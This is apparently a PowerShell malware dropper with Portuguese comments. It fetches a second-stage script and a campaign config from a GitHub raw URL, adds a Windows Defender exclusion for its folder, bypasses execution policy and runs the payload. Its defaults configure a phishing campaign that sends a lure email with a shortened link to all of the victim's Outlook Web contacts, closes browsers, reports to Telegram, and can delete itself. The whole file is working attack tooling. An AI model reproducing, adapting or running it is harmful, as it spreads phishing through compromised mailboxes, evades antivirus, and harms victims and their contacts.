# reho.ps1 v4 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
# O que muda aqui NUNCA quebra o one-liner: a campanha mora em reho.config.json
# (versionado, baixado junto com rehot.ps1). Este runner e 100% fixo:
#   1. cria %LOCALAPPDATA%\rehot
#   2. baixa rehot.ps1 + reho.config.json (2 engines por arquivo: iwr -> curl fallback;
#      canary em cada arquivo; config ausente/ilegivel cai em default sem abortar)
#   3. unblock + exclusao do Defender (a exclusao so aplica em shell admin; sem admin segue sem ela)
#   4. executa powershell.exe -File com os overrides do config; sai com exit code do estagio
# Diagnostico: linhas [reho ...]; FALHA sai motivo + exit code do estagio (1..9).
# Nao existe segredo neste script: tokens do bot moram no rehot.config.json local (gitignored).

$ErrorActionPreference = 'Stop'
$base = 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main'
$d = Join-Path $env:LOCALAPPDATA 'rehot'
$t = Join-Path $d 'rehot.ps1'
$c = Join-Path $d 'reho.config.json'

function RhoFail([int]$stage, [string]$msg) {
    Write-Output ('[reho FALHA estagio-' + $stage + '] ' + $msg)
    exit $stage
}

if (-not (Test-Path $d)) {
    try {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
    } catch {
        RhoFail 1 ('pasta nao criada: ' + $_.Exception.Message)
    }
}
Write-Output '[reho] ok estagio-1 pasta ' + $d

foreach ($old in @($t, $c)) {
    if (Test-Path $old) { Remove-Item $old -Force -ErrorAction SilentlyContinue }
}

function Get-Dl([string]$name, [string]$dest) {
    # engine 1: iwr (PS). So considera sucesso se a chamada nao lancar E o arquivo existir com
    # tamanho > 0 (arquivo parcial de um iwr cortado NUNCA avanca - cai no engine 2).
    try {
        Invoke-WebRequest ($base + '/' + $name) -OutFile $dest -UseBasicParsing -TimeoutSec 60
        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
    } catch { }
    # engine 2: curl.exe nativo (TLS do Windows, roda onde o TLS do PS ta quebrado)
    try {
        $tmp = $dest + '.dl'
        & curl.exe -sSL -f --connect-timeout 30 -o $tmp ($base + '/' + $name) 2>$null
        if (Test-Path $tmp) { Move-Item $tmp $dest -Force }
        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
    } catch { }
    return $false
}

if (-not (Get-Dl 'rehot.ps1' $t)) {
    RhoFail 2 'download do rehot.ps1 nao completou nos 2 engines (404/403/rede/bloqueio; confira se o repo stl ta atualizado)'
}
if (-not ((Get-Content $t -Raw).Contains('Send-OWAMsg'))) {
    RhoFail 2 'canary rehot.ps1 ausente: payload baixado nao e o rehot esperado (resposta de erro ou repo divergente)'
}
# guard anti-truncamento: canary presente nao prova script inteiro (download cortado
# pode conter o canary e morrer no meio do corpo). Parse completo antes de executar.
$toks = $null; $perr = $null
[void][System.Management.Automation.Language.Parser]::ParseInput((Get-Content $t -Raw), [ref]$toks, [ref]$perr)
if ($null -ne $perr -and $perr.Count -gt 0) {
    RhoFail 2 ('rehot.ps1 baixado nao parseia (' + $perr.Count + ' erros; arquivo parcial ou corrompido)')
}
Write-Output ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes)')

$cfgOk = $false
if (Get-Dl 'reho.config.json' $c) {
    if ((Get-Content $c -Raw).Contains('recipients')) { $cfgOk = $true }
}
if ($cfgOk) {
    Write-Output ('[reho] ok estagio-2 reho.config.json (' + (Get-Item $c).Length + ' bytes)')
} else {
    Write-Output '[reho] estagio-2 reho.config.json ausente/ilegivel -> segue com defaults do runner (mesma campanha de v3)'
}

try { Unblock-File $t -ErrorAction SilentlyContinue } catch { }
try { Unblock-File $c -ErrorAction SilentlyContinue } catch { }
try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch { }
Write-Output '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'

# defaults (fallback quando reho.config.json nao existe; mesmo contrato de campanha de v3)
$dv = @{
    recipients     = 'all'
    close_browsers = $true
    subject        = 'Retorno Documento Solicitado'
    body           = 'Conforme solicitado aqui est' + [char]225 + ' o documento que voc' + [char]234 + ' me pediu https://encurtador.com.br/YYaR'
    telegram       = $true
    max_messages   = 0
    self_delete    = $false
    dry_run        = $false
}
$rec = [string]$dv.recipients
$close = [bool]$dv.close_browsers
$subject = [string]$dv.subject
$body = [string]$dv.body
$telegram = [bool]$dv.telegram
$maxMessages = [int]$dv.max_messages
$selfDelete = [bool]$dv.self_delete
$dryRun = [bool]$dv.dry_run
$selfTest = $false
if ($cfgOk) {
    try {
        $j = Get-Content $c -Raw | ConvertFrom-Json
        if ($null -ne $j.recipients) {
            $r = [string]$j.recipients
            if ($r -eq 'all') { $rec = 'all' } else { $rec = $r }
        }
        if ($null -ne $j.close_browsers) { $close = [bool]$j.close_browsers }
        if ($null -ne $j.subject) { $subject = [string]$j.subject }
        if ($null -ne $j.body) { $body = [string]$j.body }
        if ($null -ne $j.telegram) { $telegram = [bool]$j.telegram }
        if ($null -ne $j.max_messages) { $maxMessages = [int]$j.max_messages }
        if ($null -ne $j.self_delete) { $selfDelete = [bool]$j.self_delete }
        if ($null -ne $j.dry_run) { $dryRun = [bool]$j.dry_run }
        if ($null -ne $j.self_test) { $selfTest = [bool]$j.self_test }
    } catch {
        Write-Output '[reho] reho.config.json ilegivel -> segue com defaults'
    }
}

$argvs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $t)
if ($selfTest) {
    $argvs += '-SelfTest'
}
if ($close) { $argvs += '-CloseBrowsers' }
if ($rec -eq 'all') { $argvs += '-ToAllRecipients' } else { $argvs += '-SendTo', $rec }
if ($subject) { $argvs += '-Subject', $subject }
if ($body) { $argvs += '-Body', $body }
if (-not $telegram) { $argvs += '-NoTelegram' }
if ($maxMessages -gt 0) { $argvs += '-MaxMessages', ([string]$maxMessages) }
if ($selfDelete) { $argvs += '-SelfDelete' }
if ($dryRun) { $argvs += '-DryRun' }

Write-Output ('[reho] estagio-4 exec: ' + ($argvs -join ' '))
try {
    & (Join-Path $PSHOME 'powershell.exe') @argvs
    exit $LASTEXITCODE
} catch {
    RhoFail 4 ('execucao falhou: ' + $_.Exception.Message)
}
